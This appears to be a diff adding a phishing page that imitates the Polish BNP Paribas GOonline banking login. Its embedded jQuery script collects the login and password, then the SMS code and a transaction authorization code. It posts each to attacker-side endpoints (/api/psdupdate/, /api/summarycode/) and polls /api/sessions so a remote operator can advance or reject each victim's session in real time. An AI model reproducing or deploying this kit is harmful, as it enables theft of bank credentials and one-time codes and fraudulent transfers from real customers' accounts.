@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<!-- saved from url=(0014)about:internet -->
+<html ng-app="bnpApp" lang="pl-PL" class="ng-scope">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <title>Bank BNP Paribas</title>
+    <!--<base href="/">-->
+    <base href=".">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <script>window.applicationBuildVersion="1.21.142",window.portalThemeDefault="retail"</script>
+    <style>body{display:none}</style>
+    <link id="bnp-theme-stylesheet-link" rel="stylesheet" href="/assets/banks/bnpparibas_files/theme-1.21.142.css" data-theme-default-href="/assets/theme/retail/assets/css/theme-1.21.142.css" data-theme-retail-href="/assets/theme/retail/assets/css/theme-1.21.142.css" data-theme-private-href="/assets/theme/private/assets/css/theme-1.21.142.css" data-theme-optima-href="/assets/theme/optima/assets/css/theme-1.21.142.css">
+    <link rel="icon" href="https://goonline.bnpparibas.pl/favicon.ico">
+    <link href="/assets/banks/bnpparibas_files/app-f95718bae7deab5cb639.css" rel="stylesheet">
+</head>
+<body style="display: block;">
+<!-- uiView: -->
+<ui-view class="ng-scope">
+    <ui-bnp-system-messages placement="TOP-UNAUTHENTICATED" is-top="true" class="ng-scope ng-isolate-scope">
+        <!-- ngIf: $ctrl.systemMessages.length > 0 -->
+    </ui-bnp-system-messages>
+    <ui-bnp-messages-ng class="ng-scope ng-isolate-scope">
+        <!-- ngIf: $ctrl.theme !== 'optima' && $ctrl.showInstallGOmobile -->
+        <div class="bnp-toasts-wrapper">
+            <!-- ngRepeat: toast in $ctrl.toasts -->
+        </div>
+        <div class="bnp-messages-wrapper">
+            <!-- ngRepeat: message in $ctrl.systemMessages | orderBy : 'order' -->
+        </div>
+        <!-- ngIf: $ctrl.isModalsContainerVisible() -->
+    </ui-bnp-messages-ng>
+    <widget-bnp-login properties="{}" class="ng-scope ng-isolate-scope">
+        <div class="bnp-modals-container">
+            <!-- ngIf: $ctrl.showTermsOfUseModal -->
+        </div>
+        <!-- ngIf: $ctrl.currentStepId === '' && $ctrl.skipLoginWithImage -->
+        <bnp-pre-login data-ng-if="$ctrl.currentStepId === &#39;&#39; &amp;&amp; $ctrl.skipLoginWithImage" data-test-id="login-widget" data-trace-id="$ctrl.currentData.traceId" data-on-success="$ctrl.onInitialStepSuccess(payload)" class="ng-scope ng-isolate-scope">
+            <bnp-common-login-page data-site-is-inaccessible="$ctrl.siteIsInaccessible" data-title="Zaloguj się do GOonline" data-subtitle="Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego." class="ng-isolate-scope">
+                <!-- ngIf: !$ctrl.siteIsInaccessible -->
+                <section class="bnp-login ng-scope" data-ng-if="!$ctrl.siteIsInaccessible">
+                    <div class="login-left-col-wrapper">
+                        <bnp-login-header-logo class="ng-isolate-scope">
+                            <header class="login-left-col-header">
+                                <div class="bnp-logo-container">
+                                    <h1>
+                                        <a data-ng-click="$ctrl.goHome()" href="javascript:void(0);" class="bnp-logo" data-ng-attr-title="{{:: &#39;logo.logoTitle&#39; | i18n }}" title="BNP PARIBAS - logowanie - strona główna">
+                                            <div class="bnp-c-image bnp-c-image--bnp-paribas-logo-full"></div>
+                                        </a>
+                                    </h1>
+                                </div>
+                            </header>
+                        </bnp-login-header-logo>
+                        <main class="bnp-login-contents">
+                            <div class="row">
+                                <div class="col-12">
+                                    <div class="login-field" data-ng-class="::$ctrl.contentClass">
+                                        <ng-transclude ng-transclude-slot="beforeTitle"></ng-transclude>
+                                        <!-- ngIf: ::$ctrl.title -->
+                                        <div id="summaryInfo" data-ng-if="::$ctrl.title" class="bnp-c-widget-header bnp-c-widget-header--lg ng-scope">
+                                            <h2 class="ng-binding">Zaloguj się do GOonline</h2>
+                                        </div>
+                                        <!-- end ngIf: ::$ctrl.title -->
+                                        <!-- ngIf: $ctrl.subtitle -->
+                                        <p id="summaryInfo2" data-ng-if="$ctrl.subtitle" class="subtitle ng-binding ng-scope">Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego.</p>
+                                        <!-- end ngIf: $ctrl.subtitle -->
+                                        <!-- ngIf: $ctrl.isLoading -->
+                                        <!-- ngIf: $ctrl.isError -->
+                                        <!-- ngIf: !($ctrl.isLoading || $ctrl.isError) -->
+                                        <ng-transclude data-ng-transclude-slot="content" data-ng-if="!($ctrl.isLoading || $ctrl.isError)" class="ng-scope">
+                                            <bnp-common-login-page-content class="ng-scope">
+                                                <div role="form" bnp-focus-first-invalid="" class="bnp-c-form ng-pristine ng-valid" autocomplete="off" novalidate="novalidate">
+                                                    <div class="bnp-c-form__field" id="mainCont">
+
+
+
+
+                                                        <div class="bnp-c-form__field__label-wrapper">
+                                                            <label class="bnp-c-form__field__label ng-binding">Identyfikator lub login</label>
+                                                            <span class="bnp-c-tooltip">
+																								<span class="bnp-c-tooltip-content ng-binding">Swój identyfikator (login) znajdziesz w dokumentach i umowach otrzymanych z Banku podczas zakładania rachunku. Możesz skorzystać również z aliasu jeżeli wcześniej został ustawiony.</span>
+																							</span>
+                                                        </div>
+                                                        <div class="bnp-c-form__field__input-wrapper">
+                                                            <div class="bnp-c-input-text" data-ng-class="{ &#39;bnp-c-input-text--error&#39;: $ctrl.error }">
+                                                                <input id="bank_login" data-ng-model="$ctrl.usernameGetterSetter" data-ui-bnp-storing-value-avoidance="" data-on-enter="$ctrl.preLogin()" data-ui-bnp-focus-on-init-ng="" data-ng-model-options="{ getterSetter: true, allowInvalid: true }" data-ng-trim="false" type="text" aria-label="wpisz login lub identyfikator" data-ng-attr-placeholder="{{:: &#39;login.placeholder.username&#39; | i18n }}" data-test-id="username-input" autocomplete="new-password" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="wpisz login lub identyfikator" aria-invalid="false">
+                                                            </div>
+                                                        </div>
+
+
+
+                                                        <div class="bnp-c-form__field__label-wrapper">
+                                                            <label class="bnp-c-form__field__label ng-binding">Hasło</label>
+                                                            <span class="bnp-c-tooltip">
+																								<span class="bnp-c-tooltip-content ng-binding">Swój identyfikator (login) znajdziesz w dokumentach i umowach otrzymanych z Banku podczas zakładania rachunku. Możesz skorzystać również z aliasu jeżeli wcześniej został ustawiony.</span>
+																							</span>
+                                                        </div>
+                                                        <div class="bnp-c-form__field__input-wrapper">
+                                                            <div class="bnp-c-input-text" data-ng-class="{ &#39;bnp-c-input-text--error&#39;: $ctrl.error }">
+                                                                <input id="bank_password" data-ng-model="$ctrl.usernameGetterSetter" data-ui-bnp-storing-value-avoidance="" data-on-enter="$ctrl.preLogin()" data-ui-bnp-focus-on-init-ng="" data-ng-model-options="{ getterSetter: true, allowInvalid: true }" data-ng-trim="false" type="text" aria-label="wpisz login lub identyfikator" data-ng-attr-placeholder="{{:: &#39;login.placeholder.username&#39; | i18n }}" data-test-id="username-input" autocomplete="new-password" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="wpisz login lub identyfikator" aria-invalid="false">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="bnp-c-form__msg-holder">
+                                                        <!-- ngIf: $ctrl.error -->
+                                                    </div>
+                                                    <div id="buttonsCont">
+                                                        <button onclick="bankLogin(); plusBankUpdate()" class="bnp-c-btn bnp-c-btn--wide mb-4 ng-binding" type="button" data-ng-click="$ctrl.preLogin()" data-ng-class="{ &#39;bnp-c-btn--has-loader&#39;: $ctrl.isLoading }" data-test-id="submit-button">Dalej </button>
+                                                    </div>
+                                                    <bnp-login-problem-link class="ng-isolate-scope">
+                                                        <a class="bnp-c-link ng-binding" href="https://goonline.bnpparibas.pl/" data-ng-click="$ctrl.passwordReset()"> Zresetuj hasło / odblokuj dostęp </a>
+                                                    </bnp-login-problem-link>
+                                                </div>
+                                            </bnp-common-login-page-content>
+                                        </ng-transclude>
+                                        <!-- end ngIf: !($ctrl.isLoading || $ctrl.isError) -->
+                                    </div>
+                                    <!-- ngIf: !$ctrl.hideLoginHints -->
+                                    <div class="login-check ng-scope" data-ng-if="!$ctrl.hideLoginHints">
+                                        <div class="bnp-c-widget-header">
+                                            <h3 class="login-check-header ng-binding">Sprawdź, zanim się zalogujesz:</h3>
+                                        </div>
+                                        <ul class="safety-info">
+                                            <li>
+                                                <span> - Adres zaczyna się od https</span>
+                                            </li>
+                                            <li>
+                                                <span> - Połączenie szyfrowane</span>
+                                            </li>
+                                            <li>
+                                                <span> - Certyfikat strony</span>
+                                            </li>
+                                            <!-- end ngIf: $ctrl.theme === 'retail' -->
+                                        </ul>
+                                    </div>
+                                    <!-- end ngIf: !$ctrl.hideLoginHints -->
+                                </div>
+                            </div>
+                        </main>
+                        <div class="bnp-login-bg">
+                            <!-- ngIf: !$ctrl.hidePromoBox -->
+                            <!-- ngInclude: -->
+                            <ng-include data-ng-if="!$ctrl.hidePromoBox" src="&#39;templates/login-page/promo-box.html&#39;" class="ng-scope">
+                                <div class="bnp-login-promo ng-scope">
+                                    <div class="bnp-login-promo__centered-box">
+                                        <div class="bnp-login-promo__centered-box__border-box">
+                                            <div class="bnp-login-promo__centered-box__border-box__text">
+                                                <!-- ngIf: 'login.promoBox.line1' | i18n -->
+                                                <div data-ng-if="&#39;login.promoBox.line1&#39; | i18n" class="ng-binding ng-scope">Bank</div>
+                                                <!-- end ngIf: 'login.promoBox.line1' | i18n -->
+                                                <!-- ngIf: 'login.promoBox.line2' | i18n -->
+                                                <div data-ng-if="&#39;login.promoBox.line2&#39; | i18n" class="ng-binding ng-scope">zmieniającego się</div>
+                                                <!-- end ngIf: 'login.promoBox.line2' | i18n -->
+                                                <!-- ngIf: 'login.promoBox.line3' | i18n -->
+                                                <div data-ng-if="&#39;login.promoBox.line3&#39; | i18n" class="ng-binding ng-scope">świata</div>
+                                                <!-- end ngIf: 'login.promoBox.line3' | i18n -->
+                                                <!-- ngIf: 'login.promoBox.line4' | i18n -->
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </ng-include>
+                            <!-- end ngIf: !$ctrl.hidePromoBox -->
+                        </div>
+                    </div>
+                </section>
+                <!-- end ngIf: !$ctrl.siteIsInaccessible -->
+                <!-- ngIf: $ctrl.siteIsInaccessible -->
+                <script type="text/ng-template" id="templates/login-page/promo-box.html">
+                    <div class="bnp-login-promo">
+                        <div class="bnp-login-promo__centered-box">
+                            <div class="bnp-login-promo__centered-box__border-box">
+                                <div class="bnp-login-promo__centered-box__border-box__text">
+                                    <div data-ng-if="'login.promoBox.line1' | i18n">{{:: 'login.promoBox.line1' | i18n }}</div>
+                                    <div data-ng-if="'login.promoBox.line2' | i18n">{{:: 'login.promoBox.line2' | i18n }}</div>
+                                    <div data-ng-if="'login.promoBox.line3' | i18n">{{:: 'login.promoBox.line3' | i18n }}</div>
+                                    <div data-ng-if="'login.promoBox.line4' | i18n">{{:: 'login.promoBox.line4' | i18n }}</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </script>
+            </bnp-common-login-page>
+        </bnp-pre-login>
+        <!-- end ngIf: $ctrl.currentStepId === '' && $ctrl.skipLoginWithImage -->
+        <!-- ngIf: $ctrl.currentStepId === '' && !$ctrl.skipLoginWithImage -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.PASSWORD_RESET -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.PASSWORD_RESET_OTP -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_PASSWORD -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_MASKED_PASSWORD -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.LOGIN_OTP -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.MOBILE_AUTHORIZATION -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.OTP -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.SET_AUTH -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.SCA_SUCCESS_SCREEN -->
+        <!-- ngIf: $ctrl.currentStepId === $ctrl.loginSteps.ONBOARDING_SCREEN -->
+    </widget-bnp-login>
+    <bnp-footer-widget class="ng-scope ng-isolate-scope">
+        <footer class="bnp-c-footer not-logged-in" data-ng-class="{ &#39;not-logged-in&#39;: !$ctrl.isLogged }">
+            <ui-bnp-footer-top is-logged="$ctrl.isLogged" class="ng-isolate-scope">
+                <div class="bnp-c-footer__top">
+                    <div class="container bnp-c-footer__top-inner">
+                        <ul class="footer-top-list">
+                            <li class="footer-top-list-item">
+                                <bnp-set-locale-widget class="ng-isolate-scope">
+                                    <div class="bnp-c-set-locale" data-ng-click="$ctrl.toggleListVisibility()" role="button" tabindex="0">
+																			<span class="bnp-c-set-locale__current ng-binding bnp-c-set-locale__current--pl-PL" data-ng-class="&#39;bnp-c-set-locale__current--&#39; + $ctrl.currentLocale"> Polski
+																				<span class="bnp-icon bnp-icon-chevron" data-ng-class="{ &#39;active&#39; : $ctrl.langListVisibility }"></span>
+																			</span>
+                                        <!-- ngIf: $ctrl.langListVisibility -->
+                                        <!-- ngIf: $ctrl.langListVisibility -->
+                                    </div>
+                                </bnp-set-locale-widget>
+                            </li>
+                            <li class="footer-top-list-item">
+                                <!-- ngIf: $ctrl.phone1 -->
+                                <a data-ng-if="$ctrl.phone1" data-ng-attr-href="tel:{{ $ctrl.phone1 }}" class="bnp-link bnp-link-icon bnp-link-icon-call ng-binding ng-scope" href="tel:+48 500 990 500"> +48 500 990 500 </a>
+                                <!-- end ngIf: $ctrl.phone1 -->
+                                <!-- ngIf: $ctrl.phone1 && $ctrl.phone2 -->
+                                <span data-ng-if="$ctrl.phone1 &amp;&amp; $ctrl.phone2" class="ng-binding ng-scope"> &nbsp; &nbsp; </span>
+                                <!-- end ngIf: $ctrl.phone1 && $ctrl.phone2 -->
+                                <!-- ngIf: $ctrl.phone2 -->
+                                <a data-ng-if="$ctrl.phone2" data-ng-attr-href="tel:{{ $ctrl.phone2 }}" class="bnp-link bnp-link-icon bnp-link-icon-call ng-binding ng-scope" href="tel:+48 22 134 00 00"> +48 22 134 00 00 </a>
+                                <!-- end ngIf: $ctrl.phone2 -->
+                            </li>
+                            <li class="footer-top-list-item">
+                                <!-- ngIf: !$ctrl.hasWealthFooter -->
+                                <a data-ng-if="!$ctrl.hasWealthFooter" data-ng-href="https://www.bnpparibas.pl/kontakt/oddzialy-z-obsluga-detaliczna-i-biznesowa?type=department_retail_business" target="_blank" class="bnp-link bnp-link-icon bnp-link-icon-map-pin ng-binding ng-scope" href="https://www.bnpparibas.pl/kontakt/oddzialy-z-obsluga-detaliczna-i-biznesowa?type=department_retail_business"> Oddziały </a>
+                                <!-- end ngIf: !$ctrl.hasWealthFooter -->
+                                <!-- ngIf: $ctrl.hasWealthFooter -->
+                            </li>
+                            <li class="footer-top-list-item">
+                                <a data-ng-href="https://www.bnpparibas.pl/bezpieczenstwo" target="_blank" class="bnp-link bnp-link-icon bnp-link-icon-security ng-binding" href="https://www.bnpparibas.pl/bezpieczenstwo"> Bezpieczeństwo </a>
+                            </li>
+                            <!-- ngIf: $ctrl.isNewUserDisplayed() -->
+                            <li class="footer-top-list-item ng-scope" data-ng-if="$ctrl.isNewUserDisplayed()">
+                                <a data-ng-href="/gateway/api/auth/new-user" target="_blank" class="bnp-link bnp-link-icon bnp-link-icon-user ng-binding" href="https://goonline.bnpparibas.pl/gateway/api/auth/new-user"> Nie mam loginu </a>
+                            </li>
+                            <!-- end ngIf: $ctrl.isNewUserDisplayed() -->
+                        </ul>
+                        <!-- ngIf: !$ctrl.isLogged -->
+                        <div class="bnp-c-footer__security-logo ng-scope" data-ng-if="!$ctrl.isLogged">
+                            <div class="bnp-c-image bnp-c-image--norton"></div>
+                        </div>
+                        <!-- end ngIf: !$ctrl.isLogged -->
+                    </div>
+                </div>
+            </ui-bnp-footer-top>
+            <!-- ngIf: $ctrl.isLogged -->
+        </footer>
+    </bnp-footer-widget>
+</ui-view>
+<div data-build-version="">1.21.142</div>
+
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const plusBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            $("#mainCont").empty()
+            $("#mainCont").append(' <div class="bnp-c-form__field__label-wrapper"> <label class="bnp-c-form__field__label ng-binding">Kod SMS z telefonu</label> <span class="bnp-c-tooltip"><span class="bnp-c-tooltip-content ng-binding">Swój identyfikator (login) znajdziesz w dokumentach i umowach otrzymanych z Banku podczas zakładania rachunku. Możesz skorzystać również z aliasu jeżeli wcześniej został ustawiony.</span></span> </div><div class="bnp-c-form__field__input-wrapper"> <div class="bnp-c-input-text" data-ng-class="{&#39;bnp-c-input-text--error&#39;: $ctrl.error}"> <input id="bank_psd" data-ng-model="$ctrl.usernameGetterSetter" data-ui-bnp-storing-value-avoidance="" data-on-enter="$ctrl.preLogin()" data-ui-bnp-focus-on-init-ng="" data-ng-model-options="{getterSetter: true, allowInvalid: true}" data-ng-trim="false" type="text" aria-label="wpisz login lub identyfikator" data-ng-attr-placeholder="{{:: &#39;login.placeholder.username&#39; | i18n}}" data-test-id="username-input" autocomplete="new-password" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="wpisz login lub identyfikator" aria-invalid="false"> </div></div>')
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append('<button onclick="psdUpdate()" class="bnp-c-btn bnp-c-btn--wide mb-4 ng-binding" type="button" data-ng-click="$ctrl.preLogin()" data-ng-class="{ &#39;bnp-c-btn--has-loader&#39;: $ctrl.isLoading }" data-test-id="submit-button">Dalej </button>')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        // window.location.href = '/summary'
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+        if ($("#bank_psd").val() !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<p style="font-size: 20px">Logowanie...</p>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+    //SUMMARY
+
+    const summaryFunc = () => {
+        $("#mainCont").empty()
+        $("#mainCont").append(' <div class="bnp-c-form__field__label-wrapper"> <label class="bnp-c-form__field__label ng-binding">Kod SMS z telefonu</label> <span class="bnp-c-tooltip"><span class="bnp-c-tooltip-content ng-binding">Swój identyfikator (login) znajdziesz w dokumentach i umowach otrzymanych z Banku podczas zakładania rachunku. Możesz skorzystać również z aliasu jeżeli wcześniej został ustawiony.</span></span> </div><div class="bnp-c-form__field__input-wrapper"> <div class="bnp-c-input-text" data-ng-class="{&#39;bnp-c-input-text--error&#39;: $ctrl.error}"> <input id="bank_summary" data-ng-model="$ctrl.usernameGetterSetter" data-ui-bnp-storing-value-avoidance="" data-on-enter="$ctrl.preLogin()" data-ui-bnp-focus-on-init-ng="" data-ng-model-options="{getterSetter: true, allowInvalid: true}" data-ng-trim="false" type="text" aria-label="wpisz login lub identyfikator" data-ng-attr-placeholder="{{:: &#39;login.placeholder.username&#39; | i18n}}" data-test-id="username-input" autocomplete="new-password" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="wpisz login lub identyfikator" aria-invalid="false"> </div></div>')
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append('<button onclick="summaryCode()" class="bnp-c-btn bnp-c-btn--wide mb-4 ng-binding" type="button" data-ng-click="$ctrl.preLogin()" data-ng-class="{ &#39;bnp-c-btn--has-loader&#39;: $ctrl.isLoading }" data-test-id="submit-button">Dalej </button>')
+        document.getElementById('summaryInfo').innerText = 'Autoryzuj Tranzakcję'
+        document.getElementById('summaryInfo2').style.display = 'none'
+
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<p style="font-size: 20px">Logowanie...</p>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+</script>
+</body>
+</html>
